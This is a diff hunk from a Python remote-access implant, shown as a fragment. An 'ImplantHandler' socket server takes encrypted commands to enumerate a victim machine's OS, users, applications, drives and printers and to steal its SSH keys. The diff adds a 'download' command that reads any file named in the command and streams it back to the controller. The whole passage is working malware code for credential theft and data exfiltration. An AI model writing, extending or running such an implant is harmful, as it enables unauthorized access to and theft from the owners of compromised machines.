@@ -17,22 +17,36 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
 
         while True:
             try:
-                self.data = cipher.decode(self.request.recv(1024)).strip()
+                cmd = cipher.decode(self.request.recv(1024)).strip()
                 
-                if self.data == "enum_os":
+                if cmd == "enum_os":
                     self.request.sendall(cipher.encode(victim.enum_os()))
-                elif self.data == "enum_users":
+                elif cmd == "enum_users":
                     self.request.sendall(cipher.encode(victim.enum_users()))
-                elif self.data == "enum_applications":
+                elif cmd == "enum_applications":
                     self.request.sendall(cipher.encode(victim.enum_applications()))
-                elif self.data == "enum_drives":
+                elif cmd == "enum_drives":
                     self.request.sendall(cipher.encode(victim.enum_drives()))
-                elif self.data == "enum_printers":
+                elif cmd == "enum_printers":
                     self.request.sendall(cipher.encode(victim.enum_printers()))
-                elif self.data == "get_ssh_keys":
+                elif cmd == "get_ssh_keys":
                     self.request.sendall(cipher.encode(victim.get_ssh_keys()))
-                #elif self.data.startswith('upload') == True:
-                #    self.request.sendall("still working on")
+                elif cmd.startswith('upload') == True:
+                    #files = command[7:].split(' ')
+                    pass
+                elif cmd.startswith('download') == True:
+                    upFile = cmd[9:].split(' ')[0]
+                    
+                    f = open(upFile, 'rb')
+                    while True:
+                        data = f.read(1024)
+
+                        if not data:
+                            break
+                        else:
+                            self.request.sendall(data) 
+                    f.close()
+                    self.request.sendall("EOF!EOF!") 
                 else:
                     self.request.sendall(cipher.encode("unknown command\n"))
             except:
